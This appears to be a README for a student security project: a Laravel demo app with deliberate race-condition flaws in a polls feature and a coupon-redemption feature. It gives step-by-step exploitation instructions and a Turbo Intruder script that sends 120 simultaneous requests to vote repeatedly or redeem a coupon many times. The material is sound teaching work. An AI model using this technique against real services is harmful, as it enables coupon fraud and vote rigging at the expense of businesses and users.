## WIP - Race conditions in Laravel (demo)

Laravel is a very popular framework for building web applications in php. This is the reason we have chosen it for vulnerability demo purposes.

This repository contains demonstration of poor programming against race conditions. It contains several examples:

- Polls
- Coupons

In each part sleep is used to allow for easier exploit of race condition.

## Setup

1. Clone repository
2. Run `composer install`
3. Replace `.env` with `.env.example`
4. Create and connect to database
5. Run `php artisan migrate --seed` gwith default seeder
6. Run `php artisan serve` to start application. For testing race conditions local webserver should be used.
7. Log@in as `admin@admin.sk` and `adminadmin`

## Polls

First part is a simple polls app represented by Polls tab. In each poll user can vote only single time. Results of the poll can then be displayed in the Answers tab.

`/polls/2` (POST method) with body `answer: '5'`allows for voting in poll with id 2 and answer id 5

`/polls/revoke` allows for revoking all votes for currently logged in user

`/answers/` shows answer numbers for each poll

### Exploitation

1. Open up burp suite or similiar tool
2. Open inbuilt browser, login and navigate to polls
3. Start intercept mode and submit a vote
4. Copy request contents over to repeater
5. Boot up turbo intruder
6. Following script is used, where inside post the request to be repeated should be placed. Do not forget to put `\r\n\r\n` at the end of request (otherwise malformed HTTP request exception is raised)
```python
   def queueRequests(target, wordlists):
        engine = RequestEngine(endpoint=target.endpoint,
                               concurrentConnections=120,
                               requestsPerConnection=120,
                               pipeline=False)
        post = '''
            \r\n\r\n
            '''


        for i in range(1, 120):
            engine.queue(post, gate='race')

        engine.openGate('race');
        engine.complete(timeout=15)


        def handleResponse(req, interesting):
            if interesting:
                table.add(req)
```
7. Start attack and observe results. In case only one vote is added, make sure laravel is not run with `php artisan serve` but use local webserver like apache
8. Repeat the same for `v2` version for the remaining poll

## Coupons

Second part is a simple coupon redeeming app and can be found in Coupons tab. Simply choose a valid coupon and submit it in the Cart tab to redeem its value.

`/coupons/` lists all currently available coupons.

`/coupons/cart` lists current cart products with discount. Form for redeeming code is also supplied.

`/coupons/` (POST method) with body `code: 'AEZAKMI'` tries to redeem code AEZAKMI for current cart.

### Exploitation

1. Open up burp suite or similiar tool
2. Open inbuilt browser, login and navigate to coupons, choose suitable code
3. Navigate to cart, start intercept mode and apply chosen code
4. Copy request contents over to repeater
5. Boot up turbo intruder
6. Following script is used, where inside post the request to be repeated should be placed. Do not forget to put `\r\n\r\n` at the end of request (otherwise malformed HTTP request exception is raised)
```python
   def queueRequests(target, wordlists):
        engine = RequestEngine(endpoint=target.endpoint,
                               concurrentConnections=120,
                               requestsPerConnection=120,
                               pipeline=False)
        post = '''
            \r\n\r\n
            '''


        for i in range(1, 120):
            engine.queue(post, gate='race')

        engine.openGate('race');
        engine.complete(timeout=15)


        def handleResponse(req, interesting):
            if interesting:
                table.add(req)
```
7. Start attack and observe results. In case coupon is only redeemed once, make sure laravel is not run with `php artisan serve` but use local webserver like apache
8. Repeat the same for `v2` version for the remaining coupon

## TODO

- [x] Polls
- [x] Coupons
- [x] Polls exploit
- [x] Coupons exploit
- [x] Polls v2 (fixed)
- [x] Coupons v2 (fixed)

## Licensing

Repository was created during semestral work in subject Information Technologies Security.
